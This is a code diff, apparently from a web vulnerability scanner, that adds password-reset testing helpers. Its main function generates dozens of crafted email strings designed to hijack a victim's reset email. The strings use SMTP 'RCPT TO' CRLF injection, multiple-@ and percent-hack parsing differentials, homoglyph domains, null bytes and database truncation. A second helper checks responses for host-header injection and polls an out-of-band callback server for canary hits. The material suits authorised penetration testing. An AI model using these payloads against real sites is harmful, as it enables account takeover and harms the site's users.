@@ -73,6 +73,185 @@ def human_time(human: str) -> None:
 
 
 
+## Password-reset shared payloads / helpers ##
+
+# Response body substrings that indicate a reset request was accepted.
+SUCCESS_INDICATORS = [
+    "success", "email sent", "password reset", "reset link",
+    "check your email", "check your inbox", "lien envoy", "réinitialis",
+    "mot de passe", "mail envoy", "correo enviado", "email gesendet",
+    "sent you", "we have sent", "instructions", "recovery",
+]
+
+# Alternative parameter names an email value may be smuggled under.
+EMAIL_ALT_PARAMS = [
+    "Email", "mail", "username", "login", "emailAddress",
+    "e-mail", "user_email", "to", "recipient",
+]
+
+
+def detect_content_type(headers):
+    """Return 'json' | 'form' | 'multipart' | 'unknown' from request headers."""
+    for k, v in headers.items():
+        if k.lower() == "content-type":
+            v_lower = v.lower()
+            if "application/json" in v_lower:
+                return "json"
+            if "application/x-www-form-urlencoded" in v_lower:
+                return "form"
+            if "multipart/form-data" in v_lower:
+                return "multipart"
+    return "unknown"
+
+
+def build_email_hijack_payloads(victim_email, attacker_email):
+    """
+    Build the union of email-parsing-differential payloads used to hijack a
+    password-reset email: quoted/RFC-comment local parts, multiple @, percent
+    hack, null/CRLF terminators, fullwidth/homoglyph @, sub-addressing, SMTP
+    command injection, DB truncation, IDN homoglyph domains and gmail tricks.
+
+    Returns an order-preserving, de-duplicated list of crafted email strings
+    (the original victim address and no-op mutations are filtered out).
+    """
+    if "@" not in victim_email:
+        return []
+
+    v = victim_email
+    vl, vd = v.split("@", 1)
+    if "@" in attacker_email:
+        al, ad = attacker_email.split("@", 1)
+    else:
+        al, ad = "attacker", attacker_email
+    ae = attacker_email
+
+    payloads = [
+        # Case / whitespace
+        v.upper(),
+        v[0].upper() + v[1:],
+        f"{vl.upper()}@{vd}",
+        f"{vl}@{vd.upper()}",
+        f" {v}",
+        f"{v} ",
+        f"\t{v}",
+        f"{v}\t",
+        f"{vl} @{vd}",
+        f"{vl}@{vd} {ae}",
+
+        # Null byte / terminators / CRLF
+        f"{v}%00",
+        f"{v}\x00",
+        f"{v}%0a",
+        f"{v}%00@{ad}",
+        f"{v}%0d%0a@{ad}",
+
+        # Quoted local part / RFC comments
+        f'"{v}"@{ad}',
+        f'"{vl}"@{vd}@{ad}',
+        f"{vl}@{vd}({ad})",
+        f"({ad}){vl}@{vd}",
+        f'{vl}@{vd}\\"{ad}',
+
+        # Multiple @
+        f"{vl}@{ad}@{vd}",
+        f"{vl}@{vd}@{ad}",
+
+        # Percent hack
+        f"{vl}%{vd}@{ad}",
+        f"{vl}%{ad}@{vd}",
+
+        # Double encoding / fullwidth @
+        f"{vl}%2540{vd}",
+        f"{vl}%40{vd}",
+        v.replace("@", "﹫"),
+        v.replace("@", "＠"),
+
+        # Sub-addressing
+        f"{vl}+{al}@{vd}",
+        f"{vl}-{al}@{vd}",
+        f"{vl}+@{vd}",
+        f"{vl}+anything@{vd}",
+
+        # Homoglyph in local part
+        v.replace("a", "а", 1),
+
+        # Space as multi-recipient separator
+        f"{v} {ae}",
+        f"{ae} {v}",
+
+        # SMTP command injection
+        f"{v}%0d%0aRCPT TO:<{ae}>",
+        f"{v}%0d%0aDATA%0d%0a",
+        f"{v}\r\nRCPT TO:<{ae}>",
+    ]
+
+    # Local-part dot insertion (needs at least 2 chars)
+    if len(vl) >= 2:
+        payloads.append(f"{vl[0]}.{vl[1:]}@{vd}")
+
+    # DB truncation
+    pad_255 = max(0, 252 - len(v))
+    if pad_255 > 0:
+        payloads.append(f"{vl}{'a' * pad_255}@{ad}")
+    pad_64 = max(0, 61 - len(vl))
+    if pad_64 > 0:
+        payloads.append(f"{vl}{'a' * pad_64}@{ad}")
+
+    # IDN homoglyph domain
+    for char_l, char_c in [("a", "а"), ("e", "е"), ("o", "о")]:
+        if char_l in vd:
+            payloads.append(f"{vl}@{vd.replace(char_l, char_c, 1)}")
+
+    # Unicode dots in domain
+    if "." in vd:
+        parts = vd.split(".")
+        payloads.append(f"{vl}@{chr(0x3002).join(parts)}")
+        payloads.append(f"{vl}@{chr(0xFF0E).join(parts)}")
+
+    # Gmail specific
+    if "gmail" in vd.lower():
+        payloads.append(".".join(vl) + f"@{vd}")
+        payloads.append(f"{vl}@googlemail.com")
+    elif "googlemail" in vd.lower():
+        payloads.append(f"{vl}@gmail.com")
+
+    seen = set()
+    unique = []
+    for p in payloads:
+        if p and p != v and p not in seen:
+            seen.add(p)
+            unique.append(p)
+    return unique
+
+
+def check_raw_response(raw_resp, interactdom, baseline, payload, interact, canary, path):
+    """
+    Inspect a raw-socket response string for host / absolute-URI injection
+    indicators: reflection of the attacker domain, status anomaly vs baseline,
+    and an out-of-band canary/path hit on the interact server.
+    """
+    if interactdom and interactdom in raw_resp:
+        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in raw response {Colors.RESET}| PAYLOAD: {payload}")
+
+    status_match = re.search(r"HTTP/[\d.]+ (\d{3})", raw_resp)
+    if status_match:
+        status_code = int(status_match.group(1))
+        if status_code != baseline['status'] and status_code not in [400, 403]:
+            print(f"{Colors.YELLOW}   └── [{baseline['status']} > {status_code}] {Colors.RESET}| PAYLOAD: {payload}")
+
+    if interact:
+        try:
+            req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
+            if req_interact.status_code == 200:
+                if canary in req_interact.text:
+                    print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
+                if path in req_interact.text:
+                    print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
+        except requests.RequestException:
+            pass
+
+
+
 ## Anti FP ##
 
 def range_exclusion(main_len):
